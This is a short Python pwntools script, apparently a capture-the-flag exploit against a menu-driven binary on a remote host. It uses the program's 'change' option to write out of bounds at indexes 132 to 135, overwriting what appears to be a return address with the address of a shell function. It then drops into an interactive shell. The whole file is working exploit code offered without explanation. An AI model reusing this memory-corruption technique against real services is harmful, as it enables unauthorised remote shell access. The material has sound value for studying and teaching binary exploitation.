#!/usr/bin/python
#__author__: TaQini

from pwn import *
from sys import argv
# p = process('./he2aEvcOIrcubc8c')
# p = remote('192.168.33.59',8000)
p = remote(argv[1],8000)
# context.log_level = 'debug'

p.recvuntil('isc iscc isccisc iii isccc\n')

def append(v):
    p.recvuntil('5. exit\n')
    p.sendline('2')
    p.recvuntil('sccc ss cccc cciscc\n')
    p.sendline(str(v))
#2

def change(n,v):
    p.recvuntil('5. exit\n')
    p.sendline('3')
    p.recvuntil('isccc ccssii ii sccisc:\n')
    p.sendline(str(n))
    p.recvuntil('iii isccsc:\n')
    p.sendline(str(v))
#3

p.sendline('1')
p.recvuntil('iscc cc iscc isciscs\n')
#for i in range(100):
p.sendline('0')

append(1)

sh = 0x804859b


change(132,155)
change(133,133)
change(134,4)
change(135,8)

p.sendline('5')

# gdb.attach(p)

p.interactive()

